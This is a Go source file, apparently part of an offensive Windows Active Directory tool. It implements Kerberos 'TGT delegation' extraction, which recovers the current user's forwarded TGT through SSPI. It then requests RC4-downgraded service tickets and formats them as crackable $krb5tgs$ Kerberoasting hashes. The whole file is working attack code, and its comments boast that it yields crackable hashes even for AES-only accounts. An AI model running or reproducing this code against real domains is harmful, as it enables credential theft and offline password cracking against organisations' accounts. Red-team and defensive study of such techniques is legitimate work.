//go:build windows
// +build windows

package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strings"
	"time"

	"github.com/alexbrainman/sspi"
	"github.com/alexbrainman/sspi/kerberos"
	"github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/iana/keyusage"
	"github.com/jcmturner/gokrb5/v8/iana/nametype"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/jcmturner/gokrb5/v8/types"
)

// gssChecksumType is the checksum type (0x8003) used to carry GSS-API channel
// bindings and the delegation option in a Kerberos authenticator (RFC 4121).
const gssChecksumType = 0x8003

// gssDelegFlag is GSS_C_DELEG_FLAG within the RFC 4121 checksum flags field.
const gssDelegFlag = 0x01

// etypeARCFOUR is the RC4-HMAC encryption type id.
const etypeARCFOUR = 23

// delegTGT is a forwarded TGT recovered via the delegation trick, ready to be
// used to request further service tickets.
type delegTGT struct {
	Realm      string
	UserName   string
	KDC        string
	TGT        messages.Ticket
	SessionKey types.EncryptionKey
}

// extractDelegTGT performs the Kekeo "TGT delegation" trick: it asks the local
// Kerberos SSP for a delegation AP-REQ to a benign SPN, then peels the
// forwarded TGT out of the authenticator's GSS checksum.
func extractDelegTGT(cfg *Config) (*delegTGT, error) {
	// The target SPN is irrelevant to the trick - any SPN we can obtain a
	// ticket for works. The DC's HOST SPN is always present.
	targetSPN := "HOST/" + cfg.DC

	cred, err := kerberos.AcquireCurrentUserCredentials()
	if err != nil {
		return nil, fmt.Errorf("acquiring current user credentials: %w", err)
	}
	defer cred.Release()

	// NB: do not set ISC_REQ_ALLOCATE_MEMORY - the sspi library manages the
	// output buffer itself; that flag makes SSPI allocate its own buffer and
	// the library then reads back an empty one (no krb5 token).
	flags := uint32(sspi.ISC_REQ_DELEGATE | sspi.ISC_REQ_MUTUAL_AUTH | sspi.ISC_REQ_CONNECTION)
	ctx, _, token, err := kerberos.NewClientContextWithFlags(cred, targetSPN, flags)
	if err != nil {
		return nil, fmt.Errorf("requesting delegation ticket for %q: %w", targetSPN, err)
	}
	defer ctx.Release()

	apReqBytes, err := stripGSSAPIHeader(token)
	if err != nil {
		return nil, err
	}

	// The session key of the freshly minted service ticket is needed to read
	// the (encrypted) authenticator we just generated.
	sessionKey, err := getTicketSessionKey(targetSPN)
	if err != nil {
		return nil, fmt.Errorf("retrieving ticket session key: %w", err)
	}

	var ap messages.APReq
	if err := ap.Unmarshal(apReqBytes); err != nil {
		return nil, fmt.Errorf("decoding AP-REQ: %w", err)
	}
	if err := ap.DecryptAuthenticator(sessionKey); err != nil {
		return nil, fmt.Errorf("decrypting authenticator: %w", err)
	}

	cksum := ap.Authenticator.Cksum
	if cksum.CksumType != gssChecksumType {
		return nil, fmt.Errorf("authenticator carries no GSS checksum (type %d); delegation not available", cksum.CksumType)
	}
	krbCredBytes, err := extractDelegKRBCred(cksum.Checksum)
	if err != nil {
		return nil, err
	}

	var kc messages.KRBCred
	if err := kc.Unmarshal(krbCredBytes); err != nil {
		return nil, fmt.Errorf("decoding delegated KRB-CRED: %w", err)
	}
	// The KRB-CRED enc-part is sealed with the authenticator sub-session key
	// (per RFC 4121), but implementations have used the ticket session key too,
	// so try both with the standard KRB_CRED key usage.
	if err := decryptDelegEncPart(&kc, ap.Authenticator.SubKey, sessionKey); err != nil {
		return nil, err
	}
	if len(kc.Tickets) == 0 || len(kc.DecryptedEncPart.TicketInfo) == 0 {
		return nil, fmt.Errorf("delegated KRB-CRED contained no usable TGT")
	}

	info := kc.DecryptedEncPart.TicketInfo[0]
	realm := info.PRealm
	if realm == "" {
		realm = strings.ToUpper(cfg.Domain)
	}
	return &delegTGT{
		Realm:      realm,
		UserName:   strings.Join(info.PName.NameString, "/"),
		KDC:        cfg.DC,
		TGT:        kc.Tickets[0],
		SessionKey: info.Key,
	}, nil
}

// decryptDelegEncPart decrypts the KRB-CRED encrypted part, trying each
// candidate key with the standard KRB_CRED key usage and populating
// kc.DecryptedEncPart on success.
func decryptDelegEncPart(kc *messages.KRBCred, keys ...types.EncryptionKey) error {
	usages := []uint32{keyusage.KRB_CRED_ENCPART} // 14
	var tried []string
	for _, k := range keys {
		if len(k.KeyValue) == 0 {
			continue
		}
		for _, u := range usages {
			b, err := crypto.DecryptEncPart(kc.EncPart, k, u)
			if err != nil {
				tried = append(tried, fmt.Sprintf("keytype=%d usage=%d: %v", k.KeyType, u, err))
				continue
			}
			var denc messages.EncKrbCredPart
			if err := denc.Unmarshal(b); err != nil {
				tried = append(tried, fmt.Sprintf("keytype=%d usage=%d: decrypted but unmarshal failed: %v", k.KeyType, u, err))
				continue
			}
			kc.DecryptedEncPart = denc
			return nil
		}
	}
	return fmt.Errorf("could not decrypt delegated KRB-CRED (enc-part etype=%d); attempts: %s",
		kc.EncPart.EType, strings.Join(tried, "; "))
}

// extractDelegKRBCred parses the RFC 4121 GSS checksum value and returns the
// embedded KRB-CRED (the forwarded TGT) from the Deleg field.
func extractDelegKRBCred(cksum []byte) ([]byte, error) {
	// Layout: Lgth(4) Bnd(16) Flags(4) [DlgOpt(2) Dlgth(2) Deleg(Dlgth)]
	if len(cksum) < 24 {
		return nil, fmt.Errorf("GSS checksum too short (%d bytes)", len(cksum))
	}
	gssFlags := binary.LittleEndian.Uint32(cksum[20:24])
	if gssFlags&gssDelegFlag == 0 {
		return nil, fmt.Errorf("GSS checksum has no delegation flag set (TGT not forwardable?)")
	}
	if len(cksum) < 28 {
		return nil, fmt.Errorf("GSS checksum truncated before delegation length")
	}
	dlgLen := int(binary.LittleEndian.Uint16(cksum[26:28]))
	if dlgLen == 0 || len(cksum) < 28+dlgLen {
		return nil, fmt.Errorf("GSS checksum delegation field truncated (need %d, have %d)", dlgLen, len(cksum)-28)
	}
	return cksum[28 : 28+dlgLen], nil
}

// getTGSRepHashDeleg requests a service ticket for spn over the wire using the
// delegated TGT, demanding RC4-HMAC, and formats the result as a $krb5tgs$
// hash. This is what makes -tgtdeleg yield crackable RC4 hashes even for
// AES-only accounts.
func getTGSRepHashDeleg(d *delegTGT, spn, userName string) (string, error) {
	c := config.New()
	c.LibDefaults.DefaultRealm = d.Realm
	c.LibDefaults.NoAddresses = true
	c.LibDefaults.RenewLifetime = 0
	// Force RC4 in the request body so the service ticket comes back as etype 23.
	c.LibDefaults.DefaultTGSEnctypeIDs = []int32{etypeARCFOUR}
	c.LibDefaults.DefaultTGSEnctypes = []string{"rc4-hmac"}

	cname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, d.UserName)
	sname := types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, spn)

	req, err := messages.NewTGSReq(cname, d.Realm, c, d.TGT, d.SessionKey, sname, false)
	if err != nil {
		return "", fmt.Errorf("building TGS-REQ: %w", err)
	}
	b, err := req.Marshal()
	if err != nil {
		return "", fmt.Errorf("marshaling TGS-REQ: %w", err)
	}

	reply, err := sendToKDC(d.KDC, b)
	if err != nil {
		return "", fmt.Errorf("TGS exchange with %s: %w", d.KDC, err)
	}
	if len(reply) == 0 {
		return "", fmt.Errorf("empty reply from KDC")
	}
	if reply[0] == 0x7e { // APPLICATION 30 == KRB-ERROR
		var ke messages.KRBError
		if err := ke.Unmarshal(reply); err == nil {
			return "", fmt.Errorf("KDC returned %s", ke.Error())
		}
		return "", fmt.Errorf("KDC returned an undecodable error")
	}

	var rep messages.TGSRep
	if err := rep.Unmarshal(reply); err != nil {
		return "", fmt.Errorf("decoding TGS-REP: %w", err)
	}
	ed := rep.Ticket.EncPart
	if len(ed.Cipher) == 0 {
		return "", fmt.Errorf("TGS-REP ticket had no encrypted part")
	}
	return formatHash(int(ed.EType), ed.Cipher, userName, d.Realm, spn), nil
}

// sendToKDC sends a Kerberos message to the KDC over TCP (RFC 4120 framing: a
// 4-byte big-endian length prefix) and returns the reply payload.
func sendToKDC(dc string, msg []byte) ([]byte, error) {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(dc, "88"), 10*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(20 * time.Second))

	var hdr [4]byte
	binary.BigEndian.PutUint32(hdr[:], uint32(len(msg)))
	if _, err := conn.Write(append(hdr[:], msg...)); err != nil {
		return nil, fmt.Errorf("sending request: %w", err)
	}

	if _, err := io.ReadFull(conn, hdr[:]); err != nil {
		return nil, fmt.Errorf("reading reply length: %w", err)
	}
	n := binary.BigEndian.Uint32(hdr[:])
	if n == 0 || n > 10<<20 {
		return nil, fmt.Errorf("implausible reply length %d", n)
	}
	resp := make([]byte, n)
	if _, err := io.ReadFull(conn, resp); err != nil {
		return nil, fmt.Errorf("reading reply body: %w", err)
	}
	return resp, nil
}
